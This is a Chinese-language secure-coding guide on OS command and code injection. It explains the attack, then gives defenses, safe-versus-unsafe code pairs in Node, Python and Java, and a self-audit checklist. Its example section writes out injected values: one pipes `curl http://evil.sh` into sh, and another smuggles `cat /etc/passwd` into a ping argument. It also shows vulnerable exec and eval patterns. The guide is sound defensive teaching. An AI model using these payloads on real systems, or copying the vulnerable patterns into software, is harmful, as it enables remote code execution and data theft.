# 命令注入 / 代码执行 (Command & Code Injection)

> 分类：注入类 | 风险：严重 | CWE-78 / CWE-94 / CWE-95

## 1. 攻击原理

应用把用户输入拼进 shell 命令、`eval`、模板或动态加载逻辑，攻击者即可执行任意系统命令或代码，通常直接等于服务器失守（RCE）。

两种形态：

| 形态 | 触发点 | 示例分隔符 |
|---|---|---|
| OS 命令注入 | `system()`、`exec()`、`popen()`、`child_process.exec` | `;` `&&` `\|\|` `\|` `` ` `` `$()` `\n` |
| 代码注入 | `eval`、`new Function`、`setTimeout(string)`、`include`/`require` 动态路径 | 直接构造合法代码 |

参数注入：即使不拼接 shell，程序仍可能把 `-oProxyCommand=...` 这类「参数」交给下游工具（如 `git`、`curl`、`ffmpeg`）造成执行。

## 2. 攻击示例

```js
// 原始实现：图片处理
exec(`convert ${filename} -resize 200x200 out.png`);
```

输入 `filename = "a.png; curl http://evil.sh | sh"`：

```bash
convert a.png; curl http://evil.sh | sh -resize 200x200 out.png
```

Python：

```python
os.system("ping -c 1 " + host)   # host = "8.8.8.8; cat /etc/passwd"
```

反序列化之外的代码注入：

```js
eval(req.body.expression);        // 直接执行
```

## 3. 影响

- 远程代码执行、服务器完全失守、内网横向移动
- 数据窃取、挖矿、勒索、作为跳板

## 4. 防御措施

1. **能不调 shell 就不调**：使用语言原生库替代外部命令（如用 `sharp` 处理图片、`net` 做网络请求）。
2. **参数数组 + 禁止 shell**：
   - Node：`execFile(cmd, [arg1, arg2])`，绝不用 `exec()`；禁止 `shell: true`。
   - Python：`subprocess.run([...], shell=False)`，禁止 `shell=True`。
   - Java：`ProcessBuilder(List<String>)`，不要拼成单字符串。
3. **严格白名单**：参数值只能来自枚举 / 正则（如 `^[a-zA-Z0-9_-]{1,32}$`），并做长度限制。
4. **路径与参数分离**：拒绝以 `-` 开头的用户输入，必要时加 `--` 终止参数解析。
5. **禁用动态执行**：禁止 `eval` / `new Function` / `vm` 执行不可信内容；必须用时用隔离沙箱（独立进程、无网络、只读 FS、资源上限）。
6. **最小权限运行**：容器非 root、只读根文件系统、`no-new-privileges`、网络策略限制出网。
7. **审计与告警**：记录被执行命令及来源，异常命令触发告警。

## 5. 代码对比

```js
// ❌
exec(`ffmpeg -i ${file} out.mp4`);
// ✅
execFile('ffmpeg', ['-i', file, 'out.mp4'], { shell: false });
```

```python
# ❌
subprocess.run(f"tar -czf backup.tar {path}", shell=True)
# ✅
subprocess.run(["tar", "-czf", "backup.tar", path], shell=False, check=True)
```

```java
// ❌
Runtime.getRuntime().exec("ping -c 1 " + host);
// ✅
new ProcessBuilder("ping", "-c", "1", host).start();
```

## 6. 自查清单

- [ ] 全仓库搜索 `exec(`、`execSync`、`system(`、`popen`、`shell=True`、`Runtime.exec`
- [ ] 所有外部命令调用使用参数数组形式
- [ ] 用户输入未直接进入命令参数，且有白名单/正则约束
- [ ] 无 `eval` / `new Function` 处理用户数据
- [ ] 容器非 root、只读根文件系统、默认拒绝出网
- [ ] 命令执行日志与告警已接入

## 7. 参考资料

- OWASP: OS Command Injection Defense Cheat Sheet
- CWE-78 / CWE-94 / CWE-95
- PortSwigger: OS command injection
